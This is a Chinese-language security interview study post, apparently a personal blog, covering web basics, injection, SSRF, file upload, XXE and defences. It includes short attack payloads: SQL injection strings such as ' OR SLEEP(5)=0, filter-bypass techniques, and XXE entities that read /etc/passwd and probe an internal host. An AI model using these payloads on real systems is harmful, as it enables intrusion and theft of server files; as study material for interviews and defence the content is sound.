href="#Zookeeper-%E9%BB%98%E8%AE%A4%E7%9A%84%E7%AB%AF%E5%8F%A3"><span class="toc-number">57.</span> <span class="toc-text">Zookeeper 默认的端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9A%84%E6%A3%80%E6%9F%A5%E6%96%B9%E6%B3%95"><span class="toc-number">58.</span> <span class="toc-text">Zookeeper 未授权访问的检查方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%B7%E5%88%97%E5%87%BA-Zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E7%9A%84%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88"><span class="toc-number">59.</span> <span class="toc-text">请列出 Zookeeper 未授权访问漏洞的修复方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%A3%80%E6%9F%A5-mongodb-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">60.</span> <span class="toc-text">如何检查 mongodb 未授权访问漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-number">61.</span> <span class="toc-text">Redis 未授权漏洞产生原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">62.</span> <span class="toc-text">Redis 未授权漏洞利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">63.</span> <span class="toc-text">Redis 未授权漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hadoop-%E7%BB%84%E4%BB%B6%E4%B8%8E%E7%9B%B8%E5%85%B3%E7%AB%AF%E5%8F%A3"><span class="toc-number">64.</span> <span class="toc-text">Hadoop 组件与相关端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E5%AE%A2%E6%88%B7%E4%B8%AD%E4%BA%86-GhostPetya-%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%EF%BC%8C%E8%AF%B7%E6%8F%8F%E8%BF%B0%E9%9C%80%E8%A6%81%E9%87%87%E5%8F%96%E7%9A%84%E5%BA%94%E6%80%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">65.</span> <span class="toc-text">假设客户中了 GhostPetya 勒索病毒，请描述需要采取的应急解决方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5%E5%B8%B8%E8%A7%81%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC"><span class="toc-number">66.</span> <span class="toc-text">如何排查常见挖矿木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ddos-%E6%94%BB%E5%87%BB%E5%A6%82%E4%BD%95%E5%8E%BB%E9%98%B2%E8%8C%83"><span class="toc-number">67.</span> <span class="toc-text">ddos 攻击如何去防范</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%B8%85%E6%9F%A5%E4%BA%92%E8%81%94%E7%BD%91%E6%9A%B4%E9%9C%B2%E9%9D%A2"><span class="toc-number">68.</span> <span class="toc-text">如何清查互联网暴露面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%BC%80%E5%B1%95%E6%89%AB%E6%8F%8F%E4%BB%BB%E5%8A%A1"><span class="toc-number">69.</span> <span class="toc-text">如何开展扫描任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E5%B9%B6%E6%83%B3%E8%A6%81%E6%88%91%E6%96%B9%E5%B8%AE%E5%BF%99%E4%BF%AE%E5%A4%8D%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%AD%A4%E5%9C%BA%E6%99%AF%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86"><span class="toc-number">70.</span> <span class="toc-text">客户并想要我方帮忙修复漏洞，此场景怎么处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%BB%E5%8A%A1%E7%BB%93%E6%9D%9F%E5%90%8E%E6%88%91%E5%8F%B8%E5%8F%91%E7%BB%93%E6%9E%9C%E7%BB%99%E5%AE%A2%E6%88%B7%E6%97%B6%EF%BC%8C%E9%81%97%E6%BC%8F%E4%BA%86%E6%9F%90%E4%B8%AA%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%99%E5%AE%A2%E6%88%B7%E8%A7%A3%E9%87%8A%E5%A4%84%E7%90%86"><span class="toc-number">71.</span> <span class="toc-text">安全任务结束后我司发结果给客户时，遗漏了某个漏洞，如何给客户解释处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%8C%96%E7%9F%BF%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">72.</span> <span class="toc-text">服务器被挖矿的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%B8%85%E9%99%A4%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC"><span class="toc-number">73.</span> <span class="toc-text">如何清除挖矿木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81Webshell-%E6%B5%81%E9%87%8F%E4%BA%A4%E4%BA%92%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">74.</span> <span class="toc-text">1、Webshell 流量交互的流量特征有哪些</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E6%A3%80%E6%9F%A5-http-%E6%9C%8D%E5%8A%A1%E4%BD%BF%E7%94%A8%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E5%92%8C%E7%AE%80%E7%95%A5%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">75.</span> <span class="toc-text">批量检查 http 服务使用什么工具和简略使用步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E6%B4%BB%E6%80%A7%E6%8E%A2%E6%B5%8B%E7%9A%84%E7%AE%80%E8%A6%81%E6%AD%A5%E9%AA%A4"><span class="toc-number">76.</span> <span class="toc-text">存活性探测的简要步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E5%8F%91%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9F%AD%E6%97%B6%E9%97%B4%E5%86%85%E6%9F%A5%E8%AF%A2%E5%BC%82%E5%B8%B8%E6%AC%A1%E6%95%B0%E5%A2%9E%E5%A4%9A%EF%BC%8C%E6%8F%8F%E8%BF%B0-sql-%E6%9F%A5%E8%AF%A2%E5%BC%82%E5%B8%B8%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">77.</span> <span class="toc-text">假设发现数据库短时间内查询异常次数增多，描述 sql 查询异常流量分析的思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">78.</span> <span class="toc-text">描述流量分析溯源的思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wireshark-%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="toc-number">79.</span> <span class="toc-text">wireshark 简单的过滤规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%BB%99%E5%88%B0%E4%BD%A0%E6%9C%89-50-%E4%B8%87%E4%B8%AA-ip%EF%BC%8C%E8%A6%81%E6%B1%82%E4%BD%A0%E4%B8%A4%E5%91%A8%E5%86%85%E5%81%9A%E5%AE%8C%E5%85%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%8C%E4%BD%A0%E4%BC%9A%E6%80%8E%E4%B9%88%E5%81%9A"><span class="toc-number">80.</span> <span class="toc-text">客户给到你有 50 万个 ip，要求你两周内做完全端口扫描，你会怎么做</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-number">81.</span> <span class="toc-text">常见的取证分析工具</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【工作】面试题整理 常见问题
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-03T12:15:58.000Z" class="dt-published" itemprop="datePublished">2024-03-03</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="cookie-和-session-的区别"><a href="#cookie-和-session-的区别" class="headerlink" title="cookie 和 session 的区别"></a>cookie 和 session 的区别</h2><p>cookie 和 session 都是客户端与服务器之间保持状态的解决方案。<br>1）存储的位置不同<br>cookie 存放在客户端，session 存放在服务端。session 存储的数据比较安全</p>
<p>2）存储的数据类型不同<br>两者都是 key-value 的结构，但针对 value 的类型是有差异的：<br>cookie：value 只能是字符串类型，session：value 是 Object 类型</p>
<p>3）存储的数据大小限制不同<br>cookie 大小受浏览器的限制，很多是 4K 的大小；session 理论上受当前内存的限制</p>
<p>4）生命周期的控制<br>cookie 的生命周期当浏览器关闭的时候，就消亡了。<br>cookie 的生命周期是累计的，从创建时，就开始计时，20 分钟后，cookie 生命周期结束；<br>session 的生命周期是间隔的，从创建时，开始计时如在 20 分钟，没有访问 session，那么 session 生命周期被销毁。</p>
<h2 id="GET-和-POST-的区别"><a href="#GET-和-POST-的区别" class="headerlink" title="GET 和 POST 的区别"></a>GET 和 POST 的区别</h2><p>1）GET 是获取数据；POST 是修改数据<br>2）GET 把请求的数据放在 url 上，以?分割 URL 和传输数据，参数之间以&amp;相连，所以 GET 不太安全；而 POST 把数据放在 HTTP 的包体内（request body）<br>3）GET 提交的数据最大是 2k（限制实际上取决于浏览器）；POST 理论上没有限制。<br>4）GET 产生一个 TCP 数据包，浏览器会把 http header 和 data 一并发送出去，服务器响应 200(返回数据)；POST 产生两个 TCP 数据包，浏览器先发送 header，服务器响应 100 continue，浏览器再发送 data，服务器响应 200 ok(返回数据)<br>5）GET 请求会被浏览器主动缓存；而 POST 不会，除非手动设置</p>
<h2 id="OSI-的七层模型都有哪些"><a href="#OSI-的七层模型都有哪些" class="headerlink" title="OSI 的七层模型都有哪些"></a>OSI 的七层模型都有哪些</h2><p>物理层：利用传输介质为数据链路层提供物理连接，实现比特流的透明传输。<br>数据链路层：接收来自物理层的位流形式的数据，并封装成帧，传送到上一层<br>网络层：将网络地址翻译成对应的物理地址，并通过路由选择算法为分组通过通信子网选择最适当的路径。<br>传输层：在源端与目的端之间提供可靠的透明数据传输<br>会话层：负责在网络中的两节点之间建立、维持和终止通信<br>表示层：处理用户信息的表示问题，数据的编码，压缩和解压缩，数据的加密和解密<br>应用层：为用户的应用进程提供网络通信服务</p>
<h2 id="条件竞争漏洞原理与举例"><a href="#条件竞争漏洞原理与举例" class="headerlink" title="条件竞争漏洞原理与举例"></a>条件竞争漏洞原理与举例</h2><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。<br>举个例子，很多 web 程序都会有上传文件的功能，头像和图像等，服务器肯定会检查文件是否满足条件，不满足的要被删除。那么问题就在于，如果我们采用大量的并发请求，就传递一个生成恶意 webshell 的图像，访问它就可以生成 webshell。<br>在上传完成和安全检查完成并删除它的间隙，攻击者通过不断地发起访问请求的方法访问了该文件，该文件就会被执行，并且在服务器上生成一个恶意 shell 的文件。<br>至此该文件的任务就已全部完成，至于后面发现它是一个不安全的文件并把它删除的问题都已经不重要了，因为攻击者已经成功地在服务器中植入了一个 shell 文件，后续的一切就都不是问题了。</p>
<h2 id="XSS-攻击如何进行防护"><a href="#XSS-攻击如何进行防护" class="headerlink" title="XSS 攻击如何进行防护"></a>XSS 攻击如何进行防护</h2><p>1）将 HTML 元素内容、属性以及 URL 请求参数、CSS 值进行编码<br>2）当编码影响业务时，使用白名单规则进行检测和过滤<br>3）使用 W3C 提出的 CSP (Content Security Policy，内容安全策略)，定义域名白名单<br>4）设置 Cookie 的 HttpOnly 属性。</p>
<h2 id="应该如何防范-CSRF-攻击"><a href="#应该如何防范-CSRF-攻击" class="headerlink" title="应该如何防范 CSRF 攻击"></a>应该如何防范 CSRF 攻击</h2><p>1）针对实际情况，设置关键 Cookie 的 SameSite 属性为 Strict 或 Lax<br>2）服务端验证请求来源站点(Referer、Origin)<br>3）使用 CSRF Token，服务端随机生成返回给浏览器的 Token，每一次请求都会携带不同的 CSRF Token<br>4）加入二次验证(独立的支付密码)</p>
<h2 id="如何突破注入时字符被转义"><a href="#如何突破注入时字符被转义" class="headerlink" title="如何突破注入时字符被转义"></a>如何突破注入时字符被转义</h2><p>宽字符注入、hex 编码绕过</p>
<ul>
<li>宽字符注入：宽字符注入是一种利用宽字符集中的字符进行SQL注入的技术。在某些数据库系统中，宽字符集中的字符可能不会被正确地转义，从而可以绕过安全措施。例如，在MySQL中，可以使用%df来表示一个宽字符，然后在注入的SQL语句中使用这个字符。</li>
<li>Hex编码绕过：将注入的SQL语句中的特定字符转换为十六进制编码，可以绕过一些简单的字符过滤机制。例如，如果’（单引号）被过滤，可以使用0x27来代替。</li>
<li>使用URL编码：URL编码是一种将字符转换为%后跟两位十六进制数的方法，这可以绕过一些基于字符串匹配的安全检查。例如，%22是双引号”的URL编码，%3C是小于号&lt;的URL编码。</li>
</ul>
<h2 id="在PHP、Java和Python中，执行代码、读取文件和执行命令的相关函数如下："><a href="#在PHP、Java和Python中，执行代码、读取文件和执行命令的相关函数如下：" class="headerlink" title="在PHP、Java和Python中，执行代码、读取文件和执行命令的相关函数如下："></a>在PHP、Java和Python中，执行代码、读取文件和执行命令的相关函数如下：</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>代码执行</p>
<ul>
<li><code>eval()</code>: 把字符串作为PHP代码执行。</li>
<li><code>assert()</code>: 执行一个字符串作为PHP代码（需要开启assertion）。</li>
<li><code>create_function()</code>: 创建一个匿名（Lambda风格）函数（已在PHP 7.2中废弃）。</li>
<li><code>call_user_func()</code> 和 <code>call_user_func_array()</code>: 调用回调函数。</li>
</ul>
<p>文件读取</p>
<ul>
<li><code>file_get_contents()</code>: 读取整个文件的内容。</li>
<li><code>highlight_file()</code>: 显示文件的源代码并高亮显示关键字。</li>
<li><code>fopen()</code>, <code>readfile()</code>, <code>fread()</code>, <code>fgets()</code>, <code>fgetss()</code>: 用于打开文件、读取文件内容。</li>
<li><code>parse_ini_file()</code>: 解析配置文件。</li>
<li><code>show_source()</code>: 显示文件源代码。</li>
<li><code>file()</code>: 将文件读入一个数组中，每行作为一个数组元素。</li>
</ul>
<p>命令执行</p>
<ul>
<li><code>system()</code>: 执行外部程序，并显示输出。</li>
<li><code>exec()</code>: 执行外部程序，并返回输出作为字符串。</li>
<li><code>shell_exec()</code>: 执行外部shell命令，并返回完整的输出作为字符串。</li>
<li><code>passthru()</code>: 执行外部程序，并传递原始输出直接到浏览器。</li>
<li><code>pcntl_exec()</code>: 在当前进程空间执行指定程序（需要pcntl扩展）。</li>
<li><code>popen()</code> 和 <code>proc_open()</code>: 执行命令并打开用于输入和&#x2F;或输出的文件指针。</li>
</ul>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>代码执行: Java语言本身不提供直接执行字符串代码的函数，因为这会带来严重的安全风险。Java通过编译执行字节码，通常需要通过类加载器加载类文件。</p>
<p>文件读取</p>
<ul>
<li><code>java.nio.file.Files</code> 类中的 <code>readAllBytes()</code>, <code>readAllLines()</code>: 读取文件的所有字节或行。</li>
<li><code>java.io</code> 包中的 <code>FileInputStream</code>, <code>BufferedReader</code>: 用于读取文件的字节流和字符流。</li>
</ul>
<p>命令执行</p>
<ul>
<li><code>Runtime.getRuntime().exec()</code>: 执行指定命令并返回<code>Process</code>对象。</li>
<li><code>ProcessBuilder</code>: 启动操作系统进程，可以设置环境变量和工作目录。</li>
</ul>
<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><p>代码执行</p>
<ul>
<li><code>exec()</code>: 执行动态生成的Python代码字符串。</li>
<li><code>eval()</code>: 计算字符串表达式的值，并返回结果。</li>
<li><code>compile()</code>: 将字符串编译成代码对象，可以和<code>exec()</code>或<code>eval()</code>一起使用。</li>
</ul>
<p>文件读取</p>
<ul>
<li><code>open()</code>: 打开文件并返回文件对象。</li>
<li><code>read()</code>, <code>readline()</code>, <code>readlines()</code>: 从文件对象中读取内容。</li>
<li><code>pathlib.Path.read_text()</code>: 读取文本文件的内容。</li>
</ul>
<p>命令执行</p>
<ul>
<li><code>os.system()</code>: 执行命令并等待命令执行完毕。</li>
<li><code>subprocess.run()</code>, <code>subprocess.Popen()</code>: 执行命令并提供更多控制，如捕获输出。</li>
</ul>
<h2 id="盲注是什么，怎么盲注"><a href="#盲注是什么，怎么盲注" class="headerlink" title="盲注是什么，怎么盲注"></a>盲注是什么，怎么盲注</h2><p>盲注是在 SQL 注入攻击过程中，服务器关闭了错误回显，我们单纯通过服务器返回内容的变化来判断是否存在 SQL 注入和利用的方式。</p>
<p>盲注的手段有两种：<br>一个是通过页面的返回内容是否正确(boolean-based)，来验证是否存在注入；<br>一个是通过 sql 语句处理时间的不同来判断是否存在注入(time-based)，可以用 benchmark，sleep 等造成延时效果的函数，也可以通过构造大笛卡尔积的联合查询表来达到延时的目的。</p>
<ol>
<li><p><strong>Boolean-based盲注</strong>：</p>
<ul>
<li>假设我们有一个基于用户输入的查询，例如：<code>SELECT * FROM users WHERE username = &#39;&quot; . $username . &quot;&#39; AND password = &#39;&quot; . $password . &quot;&#39;&quot;</code></li>
<li>攻击者可能会尝试发送一个用户名，其中包含SQL逻辑，例如：<code>&#39; OR &#39;1&#39;=&#39;1</code></li>
<li>如果这个查询导致返回所有用户，那么攻击者就可以推断出注入是可能的。</li>
</ul>
</li>
<li><p><strong>Time-based盲注</strong>：</p>
<ul>
<li>使用<code>SLEEP()</code>函数来延迟响应时间，例如：<code>&#39; OR SLEEP(5)=0</code></li>
<li>如果响应时间明显变长，那么攻击者就可以推断出注入是可能的。</li>
</ul>
</li>
</ol>
<p>笛卡尔积是指两个集合的所有可能的有序对的集合。在数据库查询中，如果两个表进行笛卡尔积查询，那么会返回两个表行数相乘的结果集。</p>
<p><strong>大笛卡尔积</strong>是指构造一个查询，使得查询结果集非常大，从而显著增加查询的执行时间。例如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> users</span><br><span class="line"><span class="keyword">JOIN</span> addresses <span class="keyword">ON</span> users.id <span class="operator">=</span> addresses.user_id</span><br><span class="line"><span class="keyword">JOIN</span> orders <span class="keyword">ON</span> users.id <span class="operator">=</span> orders.user_id</span><br><span class="line"><span class="keyword">WHERE</span> users.username <span class="operator">=</span> <span class="string">&#x27;admin&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果<code>users</code>表有1000行，<code>addresses</code>表有500行，<code>orders</code>表有200行，那么这个查询可能会返回100,000,000（1000 * 500 * 200）行结果，这将显著增加查询的执行时间，从而可以用来进行时间盲注攻击。</p>
<h2 id="宽字节注入产生原理以及根本原因"><a href="#宽字节注入产生原理以及根本原因" class="headerlink" title="宽字节注入产生原理以及根本原因"></a>宽字节注入产生原理以及根本原因</h2><p>1）产生原理：在数据库使用了宽字符集而 WEB 中没考虑这个问题的情况下，由于 0xBF27 是两个字符，在 PHP 中 addslash 和 magic_quotes_gpc 开启时，会对 0x27 单引号进行转义，因此 0xbf27 会变成 0xbf5c27。<br>而数据进入数据库中时，由于 0XBF5C 是一个另外的字符，因此转义符号会被前面的 bf 带着“吃掉”，单引号由此逃逸出来可以用来闭合合语句。<br>2）根本原因：<br>character_set_client（客户端的字符集）和 character_set_connection（连接层的字符集）不同，或转换函数如，iconv、mb_convert_encoding 使用不当。<br>3）解决办法：统一数据库、Web 应用、操作系统所使用的字符集，避免解析产生差异，最好都设置为 UTF-8。或对数据进行正确的转义，如 mysql_real_escape_string+mysql_set_charset 的使用。</p>
<h2 id="mysql-的网站注入-5-0-以上和-5-0-以下有什么区别"><a href="#mysql-的网站注入-5-0-以上和-5-0-以下有什么区别" class="headerlink" title="mysql 的网站注入 5.0 以上和 5.0 以下有什么区别"></a>mysql 的网站注入 5.0 以上和 5.0 以下有什么区别</h2><p>5.0 以下没有 information_schema 这个系统表，无法列表名等，只能暴力跑表名；<br>5.0 以下是多用户单操作，5.0 以上是多用户多操作。</p>
<h2 id="SSRF-漏洞的验证方法"><a href="#SSRF-漏洞的验证方法" class="headerlink" title="SSRF 漏洞的验证方法"></a>SSRF 漏洞的验证方法</h2><p>因为 SSRF 漏洞是让服务器发送请求的安全漏洞，所以就可以通过抓包分析发送的请求是否是由服务器所发送的，从而来判断是否存在 SSRF 漏洞；<br>在页面源码中查找访问的资源地址，如果该资源地址类型为 <a target="_blank" rel="noopener" href="http://www.baidu.com/xxx.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8">www.baidu.com/xxx.php?image=（地址）的就可能存在</a> SSRF 漏洞。</p>
<h2 id="SSRF-漏洞的成因、防御、绕过"><a href="#SSRF-漏洞的成因、防御、绕过" class="headerlink" title="SSRF 漏洞的成因、防御、绕过"></a>SSRF 漏洞的成因、防御、绕过</h2><p>成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。<br>利用：构造恶意内网 IP 做探测，或者使用其余所支持的协议对其余服务进行攻击。防御：禁止跳转，限制协议，内外网限制，URL 限制。<br>绕过：使用不同协议，针对 IP，IP 格式的绕过，针对 URL，恶意 URL 增添其他字符，@之类的。301 跳转+dns rebinding。</p>
<h2 id="导致文件包含的函数"><a href="#导致文件包含的函数" class="headerlink" title="导致文件包含的函数"></a>导致文件包含的函数</h2><p>PHP：include(), include_once(), require(), require_once(), fopen(), readfile()<br>JSP&#x2F;Servlet：java.io.File(), java.io.FileReader()<br>ASP：include file, include virtual</p>
<h4 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP"></a>PHP</h4><p>在PHP中，文件包含函数允许你将一个文件作为另一个文件的一部分包含进来。这些函数可以包含文本文件、PHP脚本或其他任何类型的文件。如果被包含的文件中包含PHP代码，那么这段代码也会被执行。</p>
<ul>
<li><code>include()</code>: 如果文件找不到，会发出一个警告，但脚本会继续执行。</li>
<li><code>include_once()</code>: 类似于<code>include()</code>，但即使文件被多次包含，也只会包含一次。</li>
<li><code>require()</code>: 如果文件找不到，会发出一个致命错误，脚本会停止执行。</li>
<li><code>require_once()</code>: 类似于<code>require()</code>，但即使文件被多次包含，也只会包含一次。</li>
<li><code>fopen()</code>: 打开文件或者URL，返回一个文件指针。</li>
<li><code>readfile()</code>: 读取文件并输出到浏览器。</li>
</ul>
<h4 id="JSP-Servlet"><a href="#JSP-Servlet" class="headerlink" title="JSP&#x2F;Servlet"></a>JSP&#x2F;Servlet</h4><p>在Java的JSP和Servlet中，可以使用<code>java.io.File</code>和<code>java.io.FileReader</code>类来读取文件内容。</p>
<ul>
<li><code>java.io.File()</code>: 创建一个File对象，表示一个文件或目录。</li>
<li><code>java.io.FileReader()</code>: 创建一个FileReader对象，用于读取字符文件。</li>
</ul>
<h4 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h4><p>在ASP（Active Server Pages）中，可以使用以下函数来包含文件：</p>
<ul>
<li><code>include file</code>: 包含一个文件，可以是ASP文件或其他文本文件。</li>
<li><code>include virtual</code>: 类似于<code>include file</code>，但可以包含虚拟路径中的文件。</li>
</ul>
<h2 id="文件上传漏洞绕过方法"><a href="#文件上传漏洞绕过方法" class="headerlink" title="文件上传漏洞绕过方法"></a>文件上传漏洞绕过方法</h2><p>前端 Js 绕过、黑白名单绕过、文件类型绕过（mime、文件头、文件内容）、路径截断绕过（00 截断）、中间件解析漏洞、条件竞争、二次渲染、编辑器漏洞</p>
<h2 id="文件上传防御方法"><a href="#文件上传防御方法" class="headerlink" title="文件上传防御方法"></a>文件上传防御方法</h2><p>上传目录的用户执行权限全部取消、判断文件类型、使用随机数改写文件名和文件路径、网站服务器和文件服务器分离、白名单检查、限制文件大小</p>
<h2 id="Sqlmap常用参数"><a href="#Sqlmap常用参数" class="headerlink" title="Sqlmap常用参数"></a>Sqlmap常用参数</h2><p>-u（指定url）、-r（读取需要注入的post请求的文本）、-m（批量跑get注入）、-p（指定注入参数）、–current-db（获取当前数据库）、–table（枚举数据库表）、–tamper（使用过waf脚本）</p>
<h2 id="XXE-漏洞原理与防御"><a href="#XXE-漏洞原理与防御" class="headerlink" title="XXE 漏洞原理与防御"></a>XXE 漏洞原理与防御</h2><p>原理：XXE（XML 外部实体注入，XML External Entity），在应用程序解析 XML 输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起 DoS 拒绝服务攻击、执行系统命令等。<br>Java 中的 XXE 支持 sun.net.<a target="_blank" rel="noopener" href="http://www.protocol/">www.protocol</a> 里的所有协议：http，https，file，ftp，mailto，jar，netdoc。一般利用 file 协议读取文件，利用 http 协议探测内网。<br>防御：配置 XML 处理器使用禁用 DTD、禁止外部实体解析、通过黑名单过滤用户提交的 XML 数据。<br>XXE（XML External Entity）漏洞是一种常见的安全漏洞，它允许攻击者通过恶意构造的XML数据来访问或破坏系统资源。以下是一些具体的XXE漏洞示例和防御措施：</p>
<h4 id="1-文件读取"><a href="#1-文件读取" class="headerlink" title="1. 文件读取"></a>1. 文件读取</h4><p>攻击者可以通过XXE漏洞读取服务器上的敏感文件。例如，攻击者可以提交以下XML数据：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段XML定义了一个外部实体<code>file</code>，它引用了服务器上的<code>/etc/passwd</code>文件。当应用程序解析这个XML时，会读取该文件的内容并将其包含在响应中。</p>
<h4 id="2-内网探测"><a href="#2-内网探测" class="headerlink" title="2. 内网探测"></a>2. 内网探测</h4><p>攻击者可以利用XXE漏洞探测内网中的其他系统。例如，攻击者可以提交以下XML数据：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">scan</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://internal.example.com&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;scan;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
